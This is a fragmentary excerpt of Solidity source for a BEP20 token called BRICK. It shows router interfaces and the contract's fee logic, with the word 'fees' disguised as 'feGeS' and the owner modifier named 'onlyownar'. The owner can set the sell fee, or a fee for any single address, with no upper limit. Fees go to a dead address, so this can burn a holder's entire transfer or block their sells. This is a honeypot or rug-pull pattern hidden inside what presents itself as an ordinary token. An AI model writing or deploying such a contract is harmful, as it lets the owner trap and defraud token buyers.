...
interface IUniswapV2Factory {
    ...
    function feGeSTo() external view returns (address);
    function feGeSToSetter() external view returns (address);
    ...
    function setfeGeSTo(address) external;
    function setfeGeSToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeGeSOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeGeSOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeGeSOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeGeSOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeGeSOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BRICK is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeGeS = 0;

    uint256 private _defaultBuyfeGeS = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeGeS;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeGeS = _value;
    }

    function setSlipfeGeS(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeGeS[_address] = _value;
    }

    function getSlipfeGeS(address _address) external view onlyownar returns (uint256) {
        return _slipfeGeS[_address];
    }


    function setMAccountfeGeS(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeGeS(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeGeSAmount = 0;

        if (rF) {
            uint256 tradefeGeS = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeGeS = _defaultSellfeGeS;
                }
                if (from == uniswapV2Pair) {

                    tradefeGeS = _defaultBuyfeGeS;
                }
            }
            if (_slipfeGeS[from] > 0) {
                tradefeGeS = _slipfeGeS[from];
            }

            tradefeGeSAmount = _Amount.mul(tradefeGeS).div(100);
        }


        if (tradefeGeSAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeGeSAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeGeSAmount);
            emit Transfer(from, _deadAddress, tradefeGeSAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeGeSAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeGeSAmount);
        emit Transfer(from, _to, _Amount - tradefeGeSAmount);
    }
